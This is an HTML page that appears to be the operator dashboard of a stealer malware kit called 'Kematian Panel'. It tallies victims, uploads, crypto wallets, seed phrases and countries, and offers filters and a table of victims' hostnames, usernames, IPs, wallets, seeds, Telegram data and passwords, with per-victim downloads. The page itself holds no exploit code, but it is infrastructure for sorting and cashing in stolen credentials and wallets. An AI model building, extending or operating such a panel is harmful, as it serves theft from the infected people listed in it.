<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Kematian Panel</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <header class="topbar">
    <div class="brand">
      <span class="logo">◆</span>
      <div>
        <h1>Kematian Panel</h1>
        <p class="subtitle">Harvest collection &amp; sorting</p>
      </div>
    </div>
    <div class="stats-bar" id="statsBar">
      <div class="stat"><span class="stat-val" id="statVictims">0</span><span class="stat-label">Victims</span></div>
      <div class="stat"><span class="stat-val" id="statUploads">0</span><span class="stat-label">Uploads</span></div>
      <div class="stat"><span class="stat-val" id="statWallets">0</span><span class="stat-label">Wallets</span></div>
      <div class="stat"><span class="stat-val" id="statSeeds">0</span><span class="stat-label">Seeds</span></div>
      <div class="stat"><span class="stat-val" id="statCountries">0</span><span class="stat-label">Countries</span></div>
    </div>
  </header>

  <main class="layout">
    <aside class="filters">
      <h2>Filters</h2>
      <label>
        Search
        <input type="search" id="filterQ" placeholder="hostname, user, IP…" />
      </label>
      <label>
        Country
        <select id="filterCountry">
          <option value="">All countries</option>
        </select>
      </label>
      <label>
        Wallet
        <select id="filterWallet">
          <option value="">Any</option>
          <option value="1">Has wallet</option>
          <option value="0">No wallet</option>
        </select>
      </label>
      <label>
        Seeds
        <select id="filterSeeds">
          <option value="">Any</option>
          <option value="1">Has seeds</option>
        </select>
      </label>
      <label>
        Sort
        <select id="filterSort">
          <option value="newest">Newest first</option>
          <option value="oldest">Oldest first</option>
        </select>
      </label>
      <button type="button" class="btn" id="btnRefresh">Refresh</button>
    </aside>

    <section class="content">
      <div class="table-wrap">
        <table id="victimsTable">
          <thead>
            <tr>
              <th>Hostname</th>
              <th>User</th>
              <th>Country</th>
              <th>IP</th>
              <th>Arch</th>
              <th>Wallet</th>
              <th>Seeds</th>
              <th>TG</th>
              <th>Passwords</th>
              <th>Last seen</th>
            </tr>
          </thead>
          <tbody id="victimsBody">
            <tr><td colspan="10" class="empty">Loading…</td></tr>
          </tbody>
        </table>
      </div>
    </section>

    <aside class="detail" id="detailPanel">
      <div class="detail-empty" id="detailEmpty">
        <p>Select a victim to view details and downloads.</p>
      </div>
      <div class="detail-content hidden" id="detailContent">
        <h2 id="detailTitle">—</h2>
        <div class="detail-meta" id="detailMeta"></div>
        <div class="detail-flags" id="detailFlags"></div>
        <h3>Counts</h3>
        <div class="counts-grid" id="detailCounts"></div>
        <h3>Uploads</h3>
        <ul class="upload-list" id="detailUploads"></ul>
      </div>
    </aside>
  </main>

  <script src="/app.js"></script>
</body>
</html>
